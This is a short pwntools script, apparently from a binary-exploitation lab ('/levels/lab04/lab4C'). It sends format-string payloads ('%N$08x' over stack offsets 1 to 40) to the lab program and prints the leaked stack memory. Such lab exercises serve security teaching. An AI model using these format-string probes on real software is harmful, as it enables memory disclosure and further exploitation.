from pwn import *
for i in range(1,40,10):
    p = process("/levels/lab04/lab4C")
    line = ""
    for j in range(10):
        line+=" %"+str(i+j)+"$08x"
    p.sendline(line)
    p.sendline("asda")
    print(p.recv(2000))

